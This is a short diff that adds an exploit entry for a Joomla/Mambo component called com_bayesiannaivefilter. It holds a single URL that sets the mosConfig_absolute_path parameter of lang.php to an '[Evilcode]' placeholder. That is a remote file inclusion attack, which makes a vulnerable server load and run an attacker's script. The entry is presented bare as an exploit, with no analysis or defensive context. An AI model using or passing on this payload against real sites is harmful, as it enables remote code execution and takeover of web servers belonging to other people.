@@ -1,0 +1,2 @@
+exploit:
+http://www.example.com/[path]/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=[Evilcode]
